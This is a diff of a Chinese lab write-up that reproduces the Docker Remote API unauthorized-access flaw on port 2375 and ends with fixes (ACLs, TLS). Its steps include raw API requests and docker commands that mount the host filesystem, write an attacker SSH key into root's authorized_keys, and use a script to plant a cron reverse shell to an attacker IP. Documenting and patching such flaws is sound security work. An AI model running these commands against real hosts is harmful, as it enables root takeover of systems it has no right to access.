@@ -80,13 +80,13 @@ docker run -d ubuntu:18.04 /bin/bash -c 'while true; do sleep 1; done'
 
 # 漏洞复现：
 ## 浏览器直接访问：
-1. 获取 docker 信息：
+(1)  获取 docker 信息：
 
 [http://172.26.1.97:2375/info](http://172.26.1.97:2375/info)
 
 ![5.jpg](https://ae01.alicdn.com/kf/Ueb6f622706f448dd8dd6fea1f03de2803.jpg)
 
-2. 获取image列表：
+(2)  获取image列表：
 
 [http://172.26.1.97:2375/images/json](http://172.26.1.97:2375/v1.25/images/json)
 
@@ -94,20 +94,20 @@ docker run -d ubuntu:18.04 /bin/bash -c 'while true; do sleep 1; done'
 
 
 
-3. 获取容器信息：
+(3)  获取容器信息：
 
 [http://172.26.1.97:2375/containers/json](http://172.26.1.97:2375/containers/json)
 
 ![7.jpg](https://ae01.alicdn.com/kf/Uf6ff65134f7c4167b8870f3e87040c2eE.jpg)
 
 
-4. 设置免登陆，获取服务器权限（当然得root权限启动docker）
+(4)  设置免登陆，获取服务器权限（当然得root权限启动docker）
 
 原理：
 
 利用接口创建一个新的容器，将宿主机的 /root/ 目录挂载到容器中，本例中是 /tmp 目录，然后将攻击机的 key (id_rsa.pub) 写入 /tmp/.ssh/authorized_keys 中，也就是写入到了宿主机的 /root/.ssh/authorized_keys 中，然后启动新创建的容器，就可以实现免登陆，从攻击机可以直接登录到靶机
 
-1）创建容器
+  a.创建容器
 
 ```
 POST /containers/create HTTP/1.1
@@ -137,10 +137,10 @@ Postman-Token: 7abe8d48-2e9d-4245-a7a4-dbd66279705e
 ```
 {"Id":"28f2c8024538b93ed26a7ffadf9bce86b0361139947e8fb71767d2fa0d3e2b79","Warnings":[]}
 ```
-2）获取container的信息检查一下是否有问题，这一步可以略过：
+  b.获取container的信息检查一下是否有问题，这一步可以略过：
 ![9.jpg](https://ae01.alicdn.com/kf/Ude68ad19c7a14ec99a3f8c9bb58a608aP.jpg)
 
-3）定是要先attach，再start，这样就可以捕获到输出:
+  c.定是要先attach，再start，这样就可以捕获到输出:
 
 attach包：
 
@@ -165,14 +165,14 @@ Accept-Encoding: gzip
  不知道为什么我做到start那一步就是成功不了，所以我只好换使用docker命令来执行：
 
 ## 使用docker命令连接：
-1. 连接未授权机器，查看版本信息：
+(1)  连接未授权机器，查看版本信息：
 ```
 docker -H tcp://172.26.1.97:2375 version
 ```
 查看其docker版本信息：
 ![10.jpg](https://ae01.alicdn.com/kf/U0df2781528ef497588479d2d8a4b30ade.jpg)
 
-2. 查看目标机器的镜像：
+(2)  查看目标机器的镜像：
 
 ```
 docker -H tcp://172.26.1.97:2375 images
@@ -180,7 +180,7 @@ docker -H tcp://172.26.1.97:2375 images
 截图：
 ![11.jpg](https://ae01.alicdn.com/kf/U32623262ed63424282d7f194bc01cb1bM.jpg)
 
-3. 查看目标机器的容器：
+(3)  查看目标机器的容器：
 
 ```
 docker -H tcp://172.26.1.97:2375 ps
@@ -193,7 +193,7 @@ start 启动一个已经停止的容器
 
 attach 连接一个已经停止的容器
 
-4. 新运行一个容器并将entrypoint设置为/bin/bash或者/bin/sh，挂载点设置为服务器的根目录挂载至/tmp目录下（需要root权限启动docker）
+(4)  新运行一个容器并将entrypoint设置为/bin/bash或者/bin/sh，挂载点设置为服务器的根目录挂载至/tmp目录下（需要root权限启动docker）
 
 ```
 docker -H tcp://172.26.1.97:2375 run -it -v /:/tmp --entrypoint /bin/sh ubuntu:18.04
@@ -264,14 +264,14 @@ Commands:
   wait        Block until one or more containers stop, then print their exit codes                         
 ```
 ## 使用GitHub上的脚本对该漏洞进行利用：
-1. 查看运行的容器：
+(1)  查看运行的容器：
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375
 ```
 截图:
 ![16.jpg](https://ae01.alicdn.com/kf/Uf9c0a1658ad14b04b0c3c4c9c94c3b18P.jpg)
 
-2. 查看所有的容器:
+(2)  查看所有的容器:
 
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -a
@@ -279,7 +279,7 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -a
 截图：
 ![17.jpg](https://ae01.alicdn.com/kf/Uddc8fa961ffa4ae9a034c0547b0f6f17W.jpg)
 
-3. 查看所有镜像：
+(3)  查看所有镜像：
 
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -l
@@ -287,7 +287,7 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -l
 截图：
 ![18.jpg](https://ae01.alicdn.com/kf/Ucafb5443dc5544578c5b6fc117d7e624y.jpg)
 
-4. 查看端口映射：
+(4)  查看端口映射：
 
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -L
@@ -297,7 +297,7 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -L
 
 我这里启动的docker并未映射端口，所以返回空白！
 
-5. 利用脚本写定时任务反弹shell：
+(5)  利用脚本写定时任务反弹shell：
 
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -C -i ubuntu:18.04 -H 172.26.1.156 -P 6666
@@ -305,7 +305,7 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -C -i ubuntu:18.04 -
 截图：
 ![20.jpg](https://ae01.alicdn.com/kf/Ue4ba7df9c7644ce58809a55c254c2b9ev.jpg)
 
-6. 利用脚本写ssh公钥：
+(6)  利用脚本写ssh公钥：
 
 编辑脚本
 
@@ -319,7 +319,7 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -C -i ubuntu:18.04 -
 
 ![23.jpg](https://ae01.alicdn.com/kf/Ud3b3fa4e60474215811e380f480b2aa1z.jpg)
 
-7. 在容器中执行命令
+(7)  在容器中执行命令
 
 先获取到容器id：
 
@@ -329,7 +329,7 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -C -i ubuntu:18.04 -
 
 ![25.jpg](https://ae01.alicdn.com/kf/Ucd92b54b539d49939c7b20eaf9a6a6b69.jpg)
 
-8. 删除容器：
+(8)  删除容器：
 
 ```
 py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -c -I a08a888cf9de10f4e5715f4fbf12b0c303b66c5929040cb2029d62b92cc68c4c
@@ -337,13 +337,13 @@ py -2 dockerRemoteApiGetRootShell.py -h 172.26.1.97 -p 2375 -c -I a08a888cf9de10
 截图：
 ![26.jpg](https://ae01.alicdn.com/kf/Ufa99293b893b4b8082203929ff54e5c28.jpg)
 
-9. 查看服务端api版本：
+(9)  查看服务端api版本：
 
 ![27.jpg](https://ae01.alicdn.com/kf/U86c9091bf51c4f538f01bb79de2fa5b1i.jpg)
 
 # 漏洞修复：
-1. 简单粗暴的方法，对2375端口做网络访问控制，如ACL控制，或者访问规则。
-1. 修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。
+(1)  简单粗暴的方法，对2375端口做网络访问控制，如ACL控制，或者访问规则。
+(2)  修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。
 # 参考链接：
 [https://xz.aliyun.com/t/6103#toc-24](https://xz.aliyun.com/t/6103#toc-24)
 
